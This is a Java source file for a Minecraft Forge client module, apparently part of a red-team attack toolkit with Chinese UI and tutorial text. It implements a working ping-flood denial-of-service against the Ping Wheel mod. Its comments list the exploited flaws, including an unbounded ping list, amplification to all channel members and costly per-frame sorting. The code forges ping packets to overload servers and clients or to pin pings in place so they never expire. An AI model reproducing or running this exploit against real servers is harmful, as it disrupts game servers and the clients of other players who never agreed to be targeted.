package com.redblue.red.modules.pingwheel;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * PW-03: Ping Flood DoS + Persistent Ping
 *
 * Verified against source:
 *   - PingManager.PING_REPO: unbounded ArrayList (line 16)
 *   - addOrReplacePing(): only deduplicates on authorId+sequence match (lines 28-34)
 *   - Different sequence values = new entries appended without limit
 *   - Same sequence value = replaces existing entry, resetting spawnTime (permanent ping)
 *   - updatePings() sorts entire list every frame -> O(n log n) per frame
 *   - Default rateLimit=5/sec, but if server sets rateLimit=0 -> unlimited
 *   - Each ping broadcast to all channel members = N-player amplification
 */
public class PW03_PingFlood implements AttackModule {

    private static final ResourceLocation CHANNEL =
        new ResourceLocation("ping-wheel-c2s", "ping-location");

    private int floodSeqCounter = 0;
    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "我了解这可能降低客户端性能", false),
        ConfigParam.ofEnum("mode", "模式", "FLOOD",
            "FLOOD", "PERSISTENT"),
        // flood params
        ConfigParam.ofInt("batch_size", "批量大小(每刻)", 5, 1, 50)
            .visibleWhen("mode", "FLOOD"),
        ConfigParam.ofInt("interval", "间隔(刻)", 20, 1, 200),
        // persistent ping params
        ConfigParam.ofFloat("persist_x", "持续X坐标", 0f, -30000000f, 30000000f)
            .visibleWhen("mode", "PERSISTENT"),
        ConfigParam.ofFloat("persist_y", "持续Y坐标", 64f, -64f, 320f)
            .visibleWhen("mode", "PERSISTENT"),
        ConfigParam.ofFloat("persist_z", "持续Z坐标", 0f, -30000000f, 30000000f)
            .visibleWhen("mode", "PERSISTENT"),
        ConfigParam.ofInt("persist_seq", "持续序列号", 0, 0, 100)
            .visibleWhen("mode", "PERSISTENT"),
        // channel targeting
        ConfigParam.ofString("ping_channel", "标记频道", "")
    );

    @Override public String id() { return "pw03_ping_flood"; }
    @Override public String name() { return "标记洪泛"; }
    @Override public String description() { return "大量发送标记包造成服务端压力"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择模式：FLOOD发送大量不同序列号的标记，PERSISTENT重复发送相同序列号保持标记不消失\n"
            + "2. 勾选确认选项后方可执行\n"
            + "3. 根据所选模式配置对应参数\n\n"
            + "[参数说明]\n"
            + "模式：FLOOD为洪泛模式，PERSISTENT为持续标记模式\n"
            + "批量大小：FLOOD模式下每刻发送的标记数量\n"
            + "间隔：每隔多少刻发送一次\n"
            + "持续X/Y/Z坐标：PERSISTENT模式下标记的固定坐标\n"
            + "持续序列号：PERSISTENT模式下使用的固定序列号\n"
            + "标记频道：留空为默认频道，可指定目标频道\n\n"
            + "[注意事项]\n"
            + "必须勾选确认选项才能执行\n"
            + "批量大小上限为50，过大可能导致自身断开连接\n"
            + "间隔设置过短会增加自身网络负担";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("pingwheel");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;
        doFlood(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doFlood(mc);
    }

    private void doFlood(Minecraft mc) {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("FLOOD");
        String channel = getParam("ping_channel").map(ConfigParam::getString).orElse("");
        int dimHash = mc.level.dimension().location().hashCode();

        if ("PERSISTENT".equals(mode)) {
            sendPersistentPing(mc, channel, dimHash);
        } else {
            sendFloodBatch(mc, channel, dimHash);
        }
    }

    private void sendFloodBatch(Minecraft mc, String channel, int dimHash) {
        int batchSize = getParam("batch_size").map(ConfigParam::getInt).orElse(5);
        double px = mc.player.getX();
        double py = mc.player.getY();
        double pz = mc.player.getZ();

        for (int i = 0; i < batchSize; i++) {
            // Spread coords slightly so pings don't stack visually
            double ox = px + (Math.random() - 0.5) * 20;
            double oz = pz + (Math.random() - 0.5) * 20;
            int seq = floodSeqCounter++;

            PacketForge.send(CHANNEL, buf -> {
                buf.writeUtf(channel, 128);
                buf.writeDouble(ox);
                buf.writeDouble(py);
                buf.writeDouble(oz);
                buf.writeBoolean(false);
                buf.writeInt(seq);
                buf.writeInt(dimHash);
            });
        }
    }

    private void sendPersistentPing(Minecraft mc, String channel, int dimHash) {
        float px = getParam("persist_x").map(ConfigParam::getFloat).orElse(0f);
        float py = getParam("persist_y").map(ConfigParam::getFloat).orElse(64f);
        float pz = getParam("persist_z").map(ConfigParam::getFloat).orElse(0f);
        int seq = getParam("persist_seq").map(ConfigParam::getInt).orElse(0);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeUtf(channel, 128);
            buf.writeDouble(px);
            buf.writeDouble(py);
            buf.writeDouble(pz);
            buf.writeBoolean(false);
            buf.writeInt(seq);
            buf.writeInt(dimHash);
        });
    }
}
